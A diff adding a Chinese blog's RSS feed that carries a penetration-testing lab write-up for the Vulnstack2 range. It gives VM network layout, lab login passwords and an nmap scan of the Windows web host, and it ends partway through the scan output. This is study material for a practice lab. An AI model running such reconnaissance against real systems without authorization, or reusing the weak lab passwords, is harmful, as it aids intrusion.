@@ -1,0 +1,1765 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Vulnstack(红日)靶场 on 一个俗人</title>
+        <link>https://gsygsr.github.io/categories/vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/</link>
+        <description>Recent content in Vulnstack(红日)靶场 on 一个俗人</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>zh-cn</language>
+        <copyright>一个俗人</copyright><atom:link href="https://gsygsr.github.io/categories/vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Vulnstack2</title>
+        <link>https://gsygsr.github.io/shentou/vulnstack/vulnstack2/</link>
+        <pubDate>Mon, 03 Mar 2025 14:57:16 +0800</pubDate>
+        
+        <guid>https://gsygsr.github.io/shentou/vulnstack/vulnstack2/</guid>
+        <description>&lt;img src="https://gsygsr.github.io/shentou/vulnstack/vulnstack2/15.jpg" alt="Featured image of post Vulnstack2" /&gt;&lt;h2 id=&#34;靶机配置&#34;&gt;靶机配置
+&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726381478554-812860e2-73e1-422e-b496-9e733ce3d852.png&#34;
+	width=&#34;1125&#34;
+	height=&#34;871&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726381478554-812860e2-73e1-422e-b496-9e733ce3d852_hudaf51e300ca1c7588bd276d3cbd69490_363286_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726381478554-812860e2-73e1-422e-b496-9e733ce3d852_hudaf51e300ca1c7588bd276d3cbd69490_363286_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;129&#34;
+		data-flex-basis=&#34;309px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726295032140-7ef1db86-f3a1-45ed-937c-e3c184a091f4.png&#34;
+	width=&#34;699&#34;
+	height=&#34;574&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726295032140-7ef1db86-f3a1-45ed-937c-e3c184a091f4_hu05e52be93e522391f0d2a393043dcf3a_27995_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726295032140-7ef1db86-f3a1-45ed-937c-e3c184a091f4_hu05e52be93e522391f0d2a393043dcf3a_27995_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;121&#34;
+		data-flex-basis=&#34;292px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;给了三个靶机,WEB和PC需要两张网卡,一个nat,一个仅主机.DC不需要和外网通信,所以只需要一张仅主机网卡&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;靶场统一登录密码：1qaz@WSX&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(33, 37, 41);&#34;&gt;WEB和DC的登录密码被我改为了&lt;/font&gt;&lt;code&gt;123456Abc&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(33, 37, 41);&#34;&gt;WEB:&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;192.168.254.130&lt;/code&gt;&lt;font style=&#34;color:rgb(33, 37, 41);&#34;&gt;外     &lt;/font&gt;&lt;code&gt;10.10.10.80&lt;/code&gt;&lt;font style=&#34;color:rgb(33, 37, 41);&#34;&gt;内&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(33, 37, 41);&#34;&gt;PC:&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;192.168.254.129&lt;/code&gt;&lt;font style=&#34;color:rgb(33, 37, 41);&#34;&gt;外   &lt;/font&gt;&lt;code&gt;10.10.10.128&lt;/code&gt;&lt;font style=&#34;color:rgb(33, 37, 41);&#34;&gt;内&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(33, 37, 41);&#34;&gt;DC:&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;10.10.10.10&lt;/code&gt;&lt;font style=&#34;color:rgb(33, 37, 41);&#34;&gt;内&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(33, 37, 41);&#34;&gt;kali:&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;192.168.254.128&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(33, 37, 41);&#34;&gt;WEB启动一下&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726384615549-4a430109-c751-4cb5-8047-c6b1e028dd87.png&#34;
+	width=&#34;842&#34;
+	height=&#34;390&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726384615549-4a430109-c751-4cb5-8047-c6b1e028dd87_hu9d561ec5c31e7a2931f2fd80edfb0653_40087_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726384615549-4a430109-c751-4cb5-8047-c6b1e028dd87_hu9d561ec5c31e7a2931f2fd80edfb0653_40087_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;215&#34;
+		data-flex-basis=&#34;518px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;信息收集&#34;&gt;信息收集
+&lt;/h2&gt;&lt;h3 id=&#34;扫端口&#34;&gt;扫端口
+&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;68
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;69
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;70
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;71
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;72
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;73
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;74
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;75
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;76
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;77
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;78
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;79
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;80
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;81
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;82
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;83
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;84
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;85
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;86
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;87
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;88
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;sudo&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;nmap&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sV&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sC&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;192.168.254.130&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Starting&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Nmap&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;7.94&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SVN&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;https&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nmap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;org&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;at&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2024&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;09&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;15&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;03&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;22&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;EDT&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Stats&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;00&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;25&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elapsed&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;hosts&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;completed&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;up&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;undergoing&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Service&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Scan&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Service&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;scan&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Timing&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;About&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;58.33&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;done&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ETC&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;03&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;23&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;00&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;15&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remaining&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Stats&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;01&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;34&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elapsed&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;hosts&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;completed&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;up&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;undergoing&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Script&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Scan&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;NSE&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Timing&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;About&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;99.94&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;done&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ETC&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;03&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;24&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;00&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remaining&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Nmap&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;scan&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;report&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;localhost&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;192.168.254.130&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Host&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;up&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0.00022&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;latency&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Not&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;shown&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;988&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;filtered&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ports&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;no&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;response&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;PORT&lt;/span&gt;      &lt;span class=&#34;n&#34;&gt;STATE&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SERVICE&lt;/span&gt;      &lt;span class=&#34;n&#34;&gt;VERSION&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mi&#34;&gt;80&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt;    &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;http&lt;/span&gt;         &lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;IIS&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;httpd&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;7.5&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_http&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;server&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;header&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;IIS&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;7.5&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_http&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Site&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;doesn&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;t have a title.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;methods&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;Potentially&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;risky&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;methods&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;TRACE&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mi&#34;&gt;135&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt;   &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;msrpc&lt;/span&gt;        &lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;RPC&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mi&#34;&gt;139&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt;   &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;netbios&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ssn&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;netbios&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ssn&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mi&#34;&gt;445&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt;   &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;microsoft&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ds&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Server&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2008&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;R2&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Standard&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;7601&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Service&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Pack&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;microsoft&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ds&lt;/span&gt;
